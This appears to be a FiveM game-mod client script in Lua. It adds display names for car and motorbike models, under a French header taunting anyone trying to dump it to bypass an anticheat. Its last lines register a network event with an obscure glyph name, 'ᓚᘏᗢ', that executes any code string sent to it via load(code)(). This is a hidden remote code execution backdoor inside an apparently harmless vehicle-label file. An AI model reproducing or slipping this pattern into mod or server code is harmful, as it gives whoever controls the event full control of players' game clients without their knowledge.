-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	AddTextEntry('bmci', 'BMW M5')
	AddTextEntry('c63', 'Mercedes C63 AMG')
	AddTextEntry('cb500f', 'Honda CB500F 2018')
	AddTextEntry('cls53', 'Mercedes CLS53 AMG')
	AddTextEntry('dodgeEMS', 'Dodge EMS')
	AddTextEntry('fct', 'Ferrari Californiat 2017')
	AddTextEntry('macla', 'Mercedes Class A')
	AddTextEntry('mlbrabus', 'Mercedes Brabus')
	AddTextEntry('rs3', 'Audi Rs3')
	AddTextEntry('tmax', 'Yamaha T-Max')
	AddTextEntry('urus2018', 'Lamborghini Urus 2018')
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)